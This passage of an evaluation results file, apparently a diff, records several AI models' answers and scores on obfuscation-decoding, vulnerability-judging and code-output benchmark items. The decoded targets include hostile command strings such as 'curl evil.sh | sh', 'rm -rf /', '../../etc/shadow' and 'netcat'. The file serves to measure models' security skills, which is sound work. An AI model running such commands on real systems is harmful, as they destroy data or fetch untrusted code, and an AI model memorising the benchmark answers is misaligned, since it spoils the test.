+"model": "openai-api/opencode/gpt-5.4",
+"task": "obfuscation_hard",
+"id": "obh-009",
+"target": "passwd",
+"answer": "passwd",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.3-codex",
+"task": "obfuscation_hard",
+"id": "obh-001",
+"target": "eval(atob(x))",
+"answer": "eval(atob(x))",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.3-codex",
+"task": "obfuscation_hard",
+"id": "obh-002",
+"target": "whoami",
+"answer": "whoami",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.3-codex",
+"task": "obfuscation_hard",
+"id": "obh-003",
+"target": "drop table",
+"answer": "drop table",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.3-codex",
+"task": "obfuscation_hard",
+"id": "obh-004",
+"target": "rm -rf /",
+"answer": "rm -rf /",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.3-codex",
+"task": "obfuscation_hard",
+"id": "obh-005",
+"target": "curl evil.sh | sh",
+"answer": "curl evil.sh | sh",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.3-codex",
+"task": "obfuscation_hard",
+"id": "obh-006",
+"target": "../../etc/shadow",
+"answer": "../../etc/shadow",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.3-codex",
+"task": "obfuscation_hard",
+"id": "obh-007",
+"target": "/bin/sh",
+"answer": "/bin/sh",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.3-codex",
+"task": "obfuscation_hard",
+"id": "obh-008",
+"target": "netcat",
+"answer": "netcat",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.3-codex",
+"task": "obfuscation_hard",
+"id": "obh-009",
+"target": "passwd",
+"answer": "passwd",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.4",
+"task": "security_reasoning_hard",
+"id": "srh-001",
+"target": "vulnerable",
+"answer": "Yes.  Reasoning: - The function recursively copies all enumerable properties from `s` into",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.4",
+"task": "security_reasoning_hard",
+"id": "srh-002",
+"target": "vulnerable",
+"answer": "Yes.  Reasoning: - The regex `^(a+)+$` has **nested quantifiers**: `(a+)` repeated by `+`.",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.4",
+"task": "security_reasoning_hard",
+"id": "srh-003",
+"target": "vulnerable",
+"answer": "Yes. It disables JWT signature verification:  - `jwt.decode(token, options={\"verify_signat",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.4",
+"task": "security_reasoning_hard",
+"id": "srh-004",
+"target": "safe",
+"answer": "The path traversal check is **mostly correct against simple `../` and symlink escapes**:  ",
+"score": "I"
+},
+{
+"model": "openai-api/opencode/gpt-5.4",
+"task": "security_reasoning_hard",
+"id": "srh-005",
+"target": "vulnerable",
+"answer": "Yes. This is vulnerable to **SSRF (Server-Side Request Forgery)** because it fetches a URL",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.4",
+"task": "security_reasoning_hard",
+"id": "srh-006",
+"target": "safe",
+"answer": "`yaml.safe_load(user_yaml)` is generally the **safe** way to parse untrusted YAML in PyYAM",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.4",
+"task": "security_reasoning_hard",
+"id": "srh-007",
+"target": "vulnerable",
+"answer": "Yes.  Reasoning: - It hashes passwords with `MD5`, which is cryptographically broken and f",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.4",
+"task": "security_reasoning_hard",
+"id": "srh-008",
+"target": "safe",
+"answer": "Reasoning: `shell=False` with a list prevents classic shell-command injection, so inputs l",
+"score": "I"
+},
+{
+"model": "openai-api/opencode/gpt-5.4",
+"task": "security_reasoning_hard",
+"id": "srh-009",
+"target": "vulnerable",
+"answer": "Yes. It compares an attacker-controlled token to a secret using normal `==`.  Reasoning: -",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.4",
+"task": "security_reasoning_hard",
+"id": "srh-010",
+"target": "safe",
+"answer": "This specific line is **not vulnerable to SQL injection** as written.  Reasoning: - It use",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.5",
+"task": "obfuscation_hard",
+"id": "obh-001",
+"target": "eval(atob(x))",
+"answer": "eval(atob(x))",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.5",
+"task": "obfuscation_hard",
+"id": "obh-002",
+"target": "whoami",
+"answer": "whoami",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.5",
+"task": "obfuscation_hard",
+"id": "obh-003",
+"target": "drop table",
+"answer": "drop table",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.5",
+"task": "obfuscation_hard",
+"id": "obh-004",
+"target": "rm -rf /",
+"answer": "rm -rf /",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.5",
+"task": "obfuscation_hard",
+"id": "obh-005",
+"target": "curl evil.sh | sh",
+"answer": "curl evil.sh | sh",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.5",
+"task": "obfuscation_hard",
+"id": "obh-006",
+"target": "../../etc/shadow",
+"answer": "../../etc/shadow",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.5",
+"task": "obfuscation_hard",
+"id": "obh-007",
+"target": "/bin/sh",
+"answer": "/bin/sh",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.5",
+"task": "obfuscation_hard",
+"id": "obh-008",
+"target": "netcat",
+"answer": "netcat",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.5",
+"task": "obfuscation_hard",
+"id": "obh-009",
+"target": "passwd",
+"answer": "passwd",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.3-codex",
+"task": "security_reasoning_hard",
+"id": "srh-001",
+"target": "vulnerable",
+"answer": "Yes \u2014 this is vulnerable to **prototype pollution**.  Reasoning: - `merge` recursively cop",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.3-codex",
+"task": "security_reasoning_hard",
+"id": "srh-002",
+"target": "vulnerable",
+"answer": "Yes \u2014 this is vulnerable to **Regular Expression Denial of Service (ReDoS)**.  Reasoning: ",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.3-codex",
+"task": "security_reasoning_hard",
+"id": "srh-003",
+"target": "vulnerable",
+"answer": "Yes \u2014 this is vulnerable.  Reasoning: - `jwt.decode(token, options={\"verify_signature\": Fa",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.3-codex",
+"task": "security_reasoning_hard",
+"id": "srh-004",
+"target": "safe",
+"answer": "It mitigates **basic `..` traversal** by using `realpath` + `commonpath`, but it is still ",
+"score": "I"
+},
+{
+"model": "openai-api/opencode/gpt-5.3-codex",
+"task": "security_reasoning_hard",
+"id": "srh-005",
+"target": "vulnerable",
+"answer": "Yes\u2014this is potentially **vulnerable**.  Reasoning: - It performs `requests.get()` on a **",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.3-codex",
+"task": "security_reasoning_hard",
+"id": "srh-006",
+"target": "safe",
+"answer": "`yaml.safe_load(user_yaml)` is generally the **secure** way to parse untrusted YAML in PyY",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.3-codex",
+"task": "security_reasoning_hard",
+"id": "srh-007",
+"target": "vulnerable",
+"answer": "Yes \u2014 this is vulnerable.  Reasoning: - It uses **MD5** for password hashing, which is cry",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.3-codex",
+"task": "security_reasoning_hard",
+"id": "srh-008",
+"target": "safe",
+"answer": "This is **not vulnerable to shell command injection** in the usual sense, because:  - `she",
+"score": "I"
+},
+{
+"model": "openai-api/opencode/gpt-5.3-codex",
+"task": "security_reasoning_hard",
+"id": "srh-009",
+"target": "vulnerable",
+"answer": "Yes\u2014this is potentially vulnerable.  Reasoning: - It compares a user-supplied token to a s",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.3-codex",
+"task": "security_reasoning_hard",
+"id": "srh-010",
+"target": "safe",
+"answer": "This specific line is using a **parameterized query** (`?` placeholder with a separate par",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.4",
+"task": "code_comprehension_hard",
+"id": "cch-001",
+"target": "object",
+"answer": "\"object\"",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.4",
+"task": "code_comprehension_hard",
+"id": "cch-002",
+"target": "number",
+"answer": "\"number\"",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.4",
+"task": "code_comprehension_hard",
+"id": "cch-003",
+"target": "0.30000000000000004",
+"answer": "0.30000000000000004",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.4",
+"task": "code_comprehension_hard",
+"id": "cch-004",
+"target": "NaN",
+"answer": "NaN",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.4",
+"task": "code_comprehension_hard",
+"id": "cch-005",
+"target": "baNaNa",
+"answer": "baNaNa",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.4",
+"task": "code_comprehension_hard",
+"id": "cch-006",
+"target": "[object Object]",
+"answer": "[object Object]",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.4",
+"task": "code_comprehension_hard",
+"id": "cch-007",
+"target": "10000000000000000",
+"answer": "10000000000000000",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.4",
+"task": "code_comprehension_hard",
+"id": "cch-008",
+"target": "string",
+"answer": "\"string\"",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.3-codex",
+"task": "code_comprehension_hard",
+"id": "cch-001",
+"target": "object",
+"answer": "object",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.3-codex",
+"task": "code_comprehension_hard",
+"id": "cch-002",
+"target": "number",
+"answer": "number",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.3-codex",
+"task": "code_comprehension_hard",
+"id": "cch-003",
+"target": "0.30000000000000004",
+"answer": "0.30000000000000004",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.3-codex",
+"task": "code_comprehension_hard",
+"id": "cch-004",
+"target": "NaN",
+"answer": "NaN",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.3-codex",
+"task": "code_comprehension_hard",
+"id": "cch-005",
+"target": "baNaNa",
+"answer": "baNaNa",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.3-codex",
+"task": "code_comprehension_hard",
+"id": "cch-006",
+"target": "[object Object]",
+"answer": "[object Object]",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.3-codex",
+"task": "code_comprehension_hard",
+"id": "cch-007",
+"target": "10000000000000000",
+"answer": "10000000000000000",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.3-codex",
+"task": "code_comprehension_hard",
+"id": "cch-008",
+"target": "string",
+"answer": "string",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-8",
+"task": "obfuscation_hard",
+"id": "obh-001",
+"target": "eval(atob(x))",
+"answer": "",
+"score": "I"
+},
+{
+"model": "anthropic/claude-opus-4-8",
+"task": "obfuscation_hard",
+"id": "obh-002",
+"target": "whoami",
+"answer": "whoami",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-8",
+"task": "obfuscation_hard",
+"id": "obh-003",
+"target": "drop table",
+"answer": "drop table",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-8",
+"task": "obfuscation_hard",
+"id": "obh-004",
+"target": "rm -rf /",
+"answer": "rm -rf /",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-8",
+"task": "obfuscation_hard",
+"id": "obh-005",
+"target": "curl evil.sh | sh",
+"answer": "",
+"score": "I"
+},
+{
+"model": "anthropic/claude-opus-4-8",
+"task": "obfuscation_hard",
+"id": "obh-006",
+"target": "../../etc/shadow",
+"answer": "../../etc/shadow",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-8",
+"task": "obfuscation_hard",
+"id": "obh-007",
+"target": "/bin/sh",
+"answer": "I need to reverse the string first, then base64-decode.  Original: `==Aaz9ibpJ2L`  Reverse",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-8",
+"task": "obfuscation_hard",
+"id": "obh-008",
+"target": "netcat",
+"answer": "noting",
+"score": "I"
+},
+{
+"model": "anthropic/claude-opus-4-8",
+"task": "obfuscation_hard",
+"id": "obh-009",
+"target": "passwd",
+"answer": "passwd",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.5",
+"task": "code_comprehension_hard",
+"id": "cch-001",
+"target": "object",
+"answer": "object",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.5",
+"task": "code_comprehension_hard",
+"id": "cch-002",
+"target": "number",
+"answer": "\"number\"",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.5",
+"task": "code_comprehension_hard",
+"id": "cch-003",
+"target": "0.30000000000000004",
+"answer": "0.30000000000000004",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.5",
+"task": "code_comprehension_hard",
+"id": "cch-004",
+"target": "NaN",
+"answer": "NaN",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.5",
+"task": "code_comprehension_hard",
+"id": "cch-005",
+"target": "baNaNa",
+"answer": "baNaNa",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.5",
+"task": "code_comprehension_hard",
+"id": "cch-006",
+"target": "[object Object]",
+"answer": "[object Object]",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.5",
+"task": "code_comprehension_hard",
+"id": "cch-007",
+"target": "10000000000000000",
+"answer": "10000000000000000",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.5",
+"task": "code_comprehension_hard",
+"id": "cch-008",
+"target": "string",
+"answer": "string",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-8",
+"task": "security_reasoning_hard",
+"id": "srh-001",
+"target": "vulnerable",
+"answer": "This code is a classic **prototype pollution** vulnerability.  ## Reasoning  The `merge` f",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-8",
+"task": "security_reasoning_hard",
+"id": "srh-002",
+"target": "vulnerable",
+"answer": "This code is vulnerable to **ReDoS (Regular Expression Denial of Service)**.  ## Reasoning",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-8",
+"task": "security_reasoning_hard",
+"id": "srh-003",
+"target": "vulnerable",
+"answer": "This code is vulnerable.  **Reasoning:**  The critical issue is `options={\"verify_signatur",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-8",
+"task": "security_reasoning_hard",
+"id": "srh-004",
+"target": "safe",
+"answer": "This code is attempting to prevent path traversal attacks. Let me analyze it.  **The defen",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-8",
+"task": "security_reasoning_hard",
+"id": "srh-005",
+"target": "vulnerable",
+"answer": "This code takes a user-supplied URL and makes an HTTP request to it, returning the respons",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-8",
+"task": "security_reasoning_hard",
+"id": "srh-006",
+"target": "safe",
+"answer": "This code uses `yaml.safe_load()` to parse YAML input, which is the recommended secure way",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-8",
+"task": "security_reasoning_hard",
+"id": "srh-007",
+"target": "vulnerable",
+"answer": "This code uses MD5 to hash passwords, which is a serious security vulnerability.  **Reason",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-8",
+"task": "security_reasoning_hard",
+"id": "srh-008",
+"target": "safe",
+"answer": "I'll analyze this code for security vulnerabilities, particularly command injection risks.",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-8",
+"task": "security_reasoning_hard",
+"id": "srh-009",
+"target": "vulnerable",
+"answer": "# Analysis  This code performs token validation using a direct equality comparison:  ```py",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-8",
+"task": "security_reasoning_hard",
+"id": "srh-010",
+"target": "safe",
+"answer": "This code uses a parameterized query, which is the correct way to prevent SQL injection.  ",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.4",
+"task": "obfuscation",
+"id": "ob-001",
+"target": "hello world",
+"answer": "hello world",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.4",
+"task": "obfuscation",
+"id": "ob-002",
+"target": "/etc/passwd",
+"answer": "/etc/passwd",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.4",
+"task": "obfuscation",
+"id": "ob-003",
+"target": "eval",
+"answer": "eval",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.4",
+"task": "obfuscation",
+"id": "ob-004",
+"target": "eval",
+"answer": "eval",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.3-codex",
+"task": "code_comprehension",
+"id": "cc-001",
+"target": "15",
+"answer": "15",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.3-codex",
+"task": "code_comprehension",
+"id": "cc-002",
+"target": "O(n^2)",
+"answer": "The time complexity is **O(n\u00b2)**.  There are two nested loops, each running `n` times, so ",
+"score": "I"
+},
+{
+"model": "openai-api/opencode/gpt-5.3-codex",
+"task": "code_comprehension",
+"id": "cc-003",
+"target": "2",
+"answer": "2",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.3-codex",
+"task": "code_comprehension",
+"id": "cc-004",
+"target": "yes",
+"answer": "Yes.",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.3-codex",
+"task": "obfuscation",
+"id": "ob-001",
+"target": "hello world",
+"answer": "hello world",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.3-codex",
+"task": "obfuscation",
+"id": "ob-002",
+"target": "/etc/passwd",
+"answer": "/etc/passwd",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.3-codex",
+"task": "obfuscation",
+"id": "ob-003",
+"target": "eval",
+"answer": "eval",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.3-codex",
+"task": "obfuscation",
+"id": "ob-004",
+"target": "eval",
+"answer": "eval",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-8",
+"task": "code_comprehension_hard",
+"id": "cch-001",
+"target": "object",
+"answer": "\"object\"",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-8",
+"task": "code_comprehension_hard",
+"id": "cch-002",
+"target": "number",
+"answer": "\"number\"",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-8",
+"task": "code_comprehension_hard",
+"id": "cch-003",
+"target": "0.30000000000000004",
+"answer": "0.30000000000000004",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-8",
+"task": "code_comprehension_hard",
+"id": "cch-004",
+"target": "NaN",
+"answer": "NaN",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-8",
+"task": "code_comprehension_hard",
+"id": "cch-005",
+"target": "baNaNa",
+"answer": "baNaNa",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-8",
+"task": "code_comprehension_hard",
+"id": "cch-006",
+"target": "[object Object]",
+"answer": "\"[object Object]\"",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-8",
+"task": "code_comprehension_hard",
+"id": "cch-007",
+"target": "10000000000000000",
+"answer": "10000000000000000",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-8",
+"task": "code_comprehension_hard",
+"id": "cch-008",
+"target": "string",
+"answer": "\"string\"",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-7",
+"task": "security_reasoning_hard",
+"id": "srh-001",
+"target": "vulnerable",
+"answer": "This is a classic prototype pollution vulnerability. The `merge` function recursively copi",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-7",
+"task": "security_reasoning_hard",
+"id": "srh-002",
+"target": "vulnerable",
+"answer": "The regex `^(a+)+$` is a classic example of a ReDoS (Regular Expression Denial of Service)",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-7",
+"task": "security_reasoning_hard",
+"id": "srh-003",
+"target": "vulnerable",
+"answer": "This code is vulnerable. It uses `jwt.decode` with `verify_signature: False`, which means ",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-7",
+"task": "security_reasoning_hard",
+"id": "srh-004",
+"target": "safe",
+"answer": "The code resolves the full path with `realpath` (following symlinks) and then checks that ",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-7",
+"task": "security_reasoning_hard",
+"id": "srh-005",
+"target": "vulnerable",
+"answer": "This code takes a user-supplied URL and makes an HTTP request to it, returning the respons",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-7",
+"task": "security_reasoning_hard",
+"id": "srh-006",
+"target": "safe",
+"answer": "`yaml.safe_load` is the safe variant of PyYAML's loader. It only constructs basic Python o",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-7",
+"task": "security_reasoning_hard",
+"id": "srh-007",
+"target": "vulnerable",
+"answer": "This code uses MD5 to hash a password, which is vulnerable for several reasons:  1. **MD5 ",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-7",
+"task": "security_reasoning_hard",
+"id": "srh-008",
+"target": "safe",
+"answer": "The code uses `subprocess.run` with `shell=False` and passes arguments as a list, which pr",
+"score": "I"
+},
+{
+"model": "anthropic/claude-opus-4-7",
+"task": "security_reasoning_hard",
+"id": "srh-009",
+"target": "vulnerable",
+"answer": "The function `check` uses `==` for string/token comparison, which is not constant-time. Th",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-7",
+"task": "security_reasoning_hard",
+"id": "srh-010",
+"target": "safe",
+"answer": "This code uses parameterized queries with the `?` placeholder, which is the correct way to",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.4",
+"task": "security_reasoning",
+"id": "sr-001",
+"target": "vulnerable",
+"answer": "Yes. This is vulnerable to SQL injection because it builds the SQL query by directly conca",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.4",
+"task": "security_reasoning",
+"id": "sr-002",
+"target": "safe",
+"answer": "This code is generally **not vulnerable to SQL injection** as shown.  Reasoning: - The SQL",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.4",
+"task": "security_reasoning",
+"id": "sr-003",
+"target": "vulnerable",
+"answer": "Yes. This is vulnerable to OS command injection.  Reasoning: - `os.system(...)` runs the s",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.4",
+"task": "security_reasoning",
+"id": "sr-004",
+"target": "safe",
+"answer": "Reasoning: `subprocess.run([...])` with a list and default `shell=False` is **not vulnerab",
+"score": "I"
+},
+{
+"model": "anthropic/claude-opus-4-7",
+"task": "obfuscation_hard",
+"id": "obh-001",
+"target": "eval(atob(x))",
+"answer": "",
+"score": "I"
+},
+{
+"model": "anthropic/claude-opus-4-7",
+"task": "obfuscation_hard",
+"id": "obh-002",
+"target": "whoami",
+"answer": "whoami",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-7",
+"task": "obfuscation_hard",
+"id": "obh-003",
+"target": "drop table",
+"answer": "drop table",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-7",
+"task": "obfuscation_hard",
+"id": "obh-004",
+"target": "rm -rf /",
+"answer": "rm -rf /",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-7",
+"task": "obfuscation_hard",
+"id": "obh-005",
+"target": "curl evil.sh | sh",
+"answer": "",
+"score": "I"
+},
+{
+"model": "anthropic/claude-opus-4-7",
+"task": "obfuscation_hard",
+"id": "obh-006",
+"target": "../../etc/shadow",
+"answer": "../../etc/shadow",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-7",
+"task": "obfuscation_hard",
+"id": "obh-007",
+"target": "/bin/sh",
+"answer": "test",
+"score": "I"
+},
+{
+"model": "anthropic/claude-opus-4-7",
+"task": "obfuscation_hard",
+"id": "obh-008",
+"target": "netcat",
+"answer": "nethic",
+"score": "I"
+},
+{
+"model": "anthropic/claude-opus-4-7",
+"task": "obfuscation_hard",
+"id": "obh-009",
+"target": "passwd",
+"answer": "passwd",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.5",
+"task": "obfuscation",
+"id": "ob-001",
+"target": "hello world",
+"answer": "hello world",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.5",
+"task": "obfuscation",
+"id": "ob-002",
+"target": "/etc/passwd",
+"answer": "/etc/passwd",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.5",
+"task": "obfuscation",
+"id": "ob-003",
+"target": "eval",
+"answer": "eval",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.5",
+"task": "obfuscation",
+"id": "ob-004",
+"target": "eval",
+"answer": "eval",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-7",
+"task": "obfuscation",
+"id": "ob-001",
+"target": "hello world",
+"answer": "hello world",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-7",
+"task": "obfuscation",
+"id": "ob-002",
+"target": "/etc/passwd",
+"answer": "/etc/passwd",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-7",
+"task": "obfuscation",
+"id": "ob-003",
+"target": "eval",
+"answer": "eval",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-7",
+"task": "obfuscation",
+"id": "ob-004",
+"target": "eval",
+"answer": "eval",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.4",
+"task": "code_comprehension",
+"id": "cc-001",
+"target": "15",
+"answer": "15",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.4",
+"task": "code_comprehension",
+"id": "cc-002",
+"target": "O(n^2)",
+"answer": "O(n\u00b2)",
+"score": "I"
+},
+{
+"model": "openai-api/opencode/gpt-5.4",
+"task": "code_comprehension",
+"id": "cc-003",
+"target": "2",
+"answer": "2",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.4",
+"task": "code_comprehension",
+"id": "cc-004",
+"target": "yes",
+"answer": "No.",
+"score": "I"
+},
+{
+"model": "anthropic/claude-opus-4-7",
+"task": "code_comprehension_hard",
+"id": "cch-001",
+"target": "object",
+"answer": "object",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-7",
+"task": "code_comprehension_hard",
+"id": "cch-002",
+"target": "number",
+"answer": "\"number\"",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-7",
+"task": "code_comprehension_hard",
+"id": "cch-003",
+"target": "0.30000000000000004",
+"answer": "0.30000000000000004",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-7",
+"task": "code_comprehension_hard",
+"id": "cch-004",
+"target": "NaN",
+"answer": "NaN",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-7",
+"task": "code_comprehension_hard",
+"id": "cch-005",
+"target": "baNaNa",
+"answer": "baNaNa",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-7",
+"task": "code_comprehension_hard",
+"id": "cch-006",
+"target": "[object Object]",
+"answer": "[object Object]",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-7",
+"task": "code_comprehension_hard",
+"id": "cch-007",
+"target": "10000000000000000",
+"answer": "10000000000000000",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-7",
+"task": "code_comprehension_hard",
+"id": "cch-008",
+"target": "string",
+"answer": "\"string\"",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.5",
+"task": "code_comprehension",
+"id": "cc-001",
+"target": "15",
+"answer": "15",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.5",
+"task": "code_comprehension",
+"id": "cc-002",
+"target": "O(n^2)",
+"answer": "O(n\u00b2)",
+"score": "I"
+},
+{
+"model": "openai-api/opencode/gpt-5.5",
+"task": "code_comprehension",
+"id": "cc-003",
+"target": "2",
+"answer": "2",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.5",
+"task": "code_comprehension",
+"id": "cc-004",
+"target": "yes",
+"answer": "Yes.",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.3-codex",
+"task": "security_reasoning",
+"id": "sr-001",
+"target": "vulnerable",
+"answer": "Yes \u2014 this is vulnerable to **SQL injection**.  Reason: `user_input` is concatenated direc",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.3-codex",
+"task": "security_reasoning",
+"id": "sr-002",
+"target": "safe",
+"answer": "This specific line is **not** vulnerable to SQL injection as written, because it uses a pa",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.3-codex",
+"task": "security_reasoning",
+"id": "sr-003",
+"target": "vulnerable",
+"answer": "Yes\u2014this is vulnerable to **command injection**.  Reasoning: - `os.system()` executes a sh",
+"score": "C"
+},
+{
+"model": "openai-api/opencode/gpt-5.3-codex",
+"task": "security_reasoning",
+"id": "sr-004",
+"target": "safe",
+"answer": "This is **not** vulnerable to classic shell-command injection, because `subprocess.run` is",
+"score": "I"
+},
+{
+"model": "anthropic/claude-opus-4-8",
+"task": "security_reasoning",
+"id": "sr-001",
+"target": "vulnerable",
+"answer": "This code is vulnerable to SQL injection.  **Reasoning:**  The code constructs a SQL query",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-8",
+"task": "security_reasoning",
+"id": "sr-002",
+"target": "safe",
+"answer": "This code uses **parameterized queries** (also called prepared statements), which is the r",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-8",
+"task": "security_reasoning",
+"id": "sr-003",
+"target": "vulnerable",
